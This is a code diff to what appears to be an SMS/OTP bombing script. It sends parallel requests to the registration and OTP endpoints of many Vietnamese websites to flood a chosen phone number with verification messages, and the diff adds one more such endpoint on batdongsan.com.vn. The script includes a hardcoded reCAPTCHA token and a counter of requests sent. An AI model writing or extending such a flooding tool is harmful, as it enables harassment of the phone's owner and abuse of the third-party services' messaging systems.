@@ -661,6 +661,8 @@ const payload = {
       'account_phone': phone,
         'recaptcha_token': '03AFcWeA7v381xRFe3ivbZ6DLZhSCCy-7BXHn8peQLvLsMjhj0gqDLgsPXXn7aMZmjv60dFtXtKwev15IXaOG3Y_ZjsvojTeWHjmgFGw5GfvbMyXCAwTWQCYNLd3kbHpFMr4EyPb-97Nz4C4UF3tBfGm-W32Qq7AnTZdxKiy-W_hQ559telE03X6dcy6TKa7ucbDiXMzir5coCZewqj8pgzNP_4nwex-4WPfVTN_FPiX_ri89IJXis30eau37mXEdm-dcz3tS_lkCz5OZaDthG_zTDzxQhw4QhGGrMdawvC_A9Y8ltN1XoU1YsDjl864Jo2cuQ6JnVJ2GS4jkE17dkrPqBOlI1xYUu3CTv7eUypbccX3685-mAN_GYtZv5Loja3Yv1B7Pec8c6yasF2DiL_SoKB24tD6eTzfo2sWI4euVy2lJiWHlSO0H6K1MOSFMuyISzJevJqTKD_1Rsq351gU76F9mOJ6SVuF0HCRZddIlYgfCsZyOgGL88MZZZjNlArXN871ALM6eBsUwnPcxraflCmlZJ2wEa66EjRuAVH1HUp9EOtW4R4B-xQMFXAOEhLOlG1fpR8b6kF21UbzE00iwWhROOE8XUXA',
     };
+
+    const batdongsanUrl = `https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=${phone}`;
             
 
     // Initial message to be edited later
@@ -739,6 +741,7 @@ const payload = {
         axios.post('https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-web', kidsplazaData, { headers: kidsplazaHeaders }), 
         axios.post('https://id.icankid.vn/api/otp/challenge/', idJsonData, { headers: idHeaders , cookies: idCookies }), 
         axios.post('https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone', thitruongsiData, { headers: thitruongsiHeaders, cookies: thitruongsiCookies }), 
+        axios.post(batdongsanUrl), 
         ])
       .then(() => {
         successCount += 22;
